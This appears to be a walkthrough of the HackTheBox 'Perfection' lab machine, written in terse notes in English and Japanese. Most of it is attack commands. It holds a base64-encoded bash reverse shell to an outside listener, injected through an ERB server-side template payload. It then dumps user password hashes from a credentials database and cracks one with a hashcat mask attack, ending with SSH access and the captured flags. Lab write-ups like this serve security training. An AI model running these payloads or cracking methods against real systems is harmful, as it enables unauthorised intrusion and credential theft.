nmap -p- --min-rate 10000 10.10.11.253

![[Perfection image.png]]

![[Perfection image 1.png]]

![[Perfection image 2.png]]

dirb http://10.10.11.253

export IP="10.10.11.253"

curl -I "http://$IP/"

curl "http://$IP/" | grep href

![[Perfection image 3.png]]

Command Injection Test

![[Perfection image 4.png]]

![[Perfection image 5.png]]

![[Perfection image 6.png]]

Initial Access

nc -nlvp 4444

![[Perfection image 7.png]]

base64 \<\<\< "bash -i >& /dev/tcp/10.10.14.120/4444 0>&1" | sed 's/\+/\%2b/'

YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMjAvNDQ0NCAwPiYxCg==

![[Perfection image 8.png]]

==🔴category1=History%0A\<%25%3dsystem(== ==🔴"echo+==YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMjAvNDQ0NCAwPiYxCg====🔴+|+base64+-d+|+bash"== ==🔴);%25>==

![[Perfection image 9.png]]

![[Perfection image 10.png]]

user.txt

find / -name "user.txt" -exec cat {} \; 2>/dev/null

![[Perfection image 11.png]]

9a354c089520cdbdcefad6845c21a2c0

Privilege Escalation

ユーザ所有ファイルの探索

find / -uid 1001 -==🔴type== f -==🔴ls== 2>/dev/null | grep -v ==🔴"/proc*"==

![[Perfection image 12.png]]

Nothing interesting owned by the user.

==🔴# Files with the name of the user in it==

find / -name ==🔴"*susan*"== -==🔴type== f -==🔴ls== 2>/dev/null

![[Perfection image 13.png]]

The /var/mail directory might have worth while information.

==🔴cat== /var/mail/susan

![[Perfection image 14.png]]

The email we found contains information about how passwords are formatted.

==🔴# Files with the word password in the home directory==

grep -i password -R .

![[Perfection image 15.png]]

strings Migration/pupilpath_credentials.db | grep -i ==🔴"susan"== ==🔴# "tina"==

strings Migration/pupilpath_credentials.db | grep -i ==🔴"tina"==

![[Perfection image 16.png]]

Susan Miller

abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f

Tina Smith

dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q

パスワード形式と見つかったハッシュを使用して、ユーザーのパスワードを決定できるようになります。

ハッシュタイプの特定

hashcat -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f "susan_nasus_?d?d?d?d?d?d?d?d?d"

![[Perfection image 17.png]]

SHA2-256

特定した値からパスワードの解析

hashcat -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f "susan_nasus_?d?d?d?d?d?d?d?d?d" --show

![[Perfection image 18.png]]

susan_nasus_413759210

ssh susan@10.10.11.253

![[Perfection image 19.png]]

![[Perfection image 20.png]]

find / -name ==🔴"root.txt"== -==🔴exec== ==🔴cat== {} \;

![[Perfection image 21.png]]

dad04167f86e18f175983de0b3b4c8b1